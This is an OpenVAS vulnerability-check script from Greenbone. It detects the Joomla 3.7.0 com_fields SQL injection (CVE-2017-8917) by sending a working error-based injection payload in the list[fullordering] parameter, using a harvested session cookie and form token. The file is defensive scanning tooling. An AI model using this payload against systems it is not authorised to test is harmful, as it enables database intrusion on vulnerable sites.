###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_sql_inj_vuln_may17.nasl 11959 2018-10-18 10:33:40Z mmartin $
#
# Joomla! Core 'com_fields' SQL Injection Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.811044");
  script_version("$Revision: 11959 $");
  script_cve_id("CVE-2017-8917");
  script_bugtraq_id(98515);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:33:40 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-05-18 10:39:51 +0530 (Thu, 18 May 2017)");
  script_name("Joomla! Core 'com_fields' SQL Injection Vulnerability");

  script_tag(name:"summary", value:"This host is running Joomla and is prone
  to SQL injection vulnerability.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host.");

  script_tag(name:"insight", value:"The flaw exists due to an inadequate
  filtering of request data input.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allow
  remote attackers to execute arbitrary SQL commands via unspecified vectors.");

  script_tag(name:"affected", value:"Joomla core version 3.7.0");

  script_tag(name:"solution", value:"Upgrade to Joomla version 3.7.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html");
  script_xref(name:"URL", value:"https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html");

  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/index.php/component/users/?view=login";

##Send Request and get response
sndReq = http_get(item:url, port:http_port);
rcvRes = http_keepalive_send_recv( port:http_port, data:sndReq);

if(rcvRes =~ "HTTP/1\.. 200" && "Set-Cookie:" >< rcvRes)
{
  cookie = eregmatch(pattern:"Set-Cookie: ([^;]+)", string:rcvRes);
  if(!cookie[1]){
    exit(0);
  }
  cookieid = cookie[1];


  fieldset = egrep(pattern:'<input.type="hidden".name="([^"]+).*fieldset', string:rcvRes);
  if(!fieldset){
    exit(0);
  }

  fieldsetid = eregmatch(pattern:'".name="([^"]+)', string:fieldset);
  if(!fieldsetid[1]){
    exit(0);
  }

  url = dir + "/index.php?option=com_fields&view=fields&layout=modal&view=" +
              "fields&layout=modal&option=com_fields&" + fieldsetid[1] +
              "=1&list%5Bfullordering%5D=UpdateXML%282%2C+concat%280x3a%2C128%2B127%2C+0x3a%29%2C+1%29";

  ##Send message and check response
  if(http_vuln_check(port:http_port, url:url, cookie: cookieid,
                     pattern:"500 Internal Server Error", extra_check:make_list("Home Page<",
                    "&copy; 2017 (j|J)oomla", "XPATH syntax error:.*&#039;.255.&#039;.*</bl")))
  {
    report = report_vuln_url(port:http_port, url:url);
    security_message(port: http_port, data: report);
    exit(0);
  }
}
exit(0);
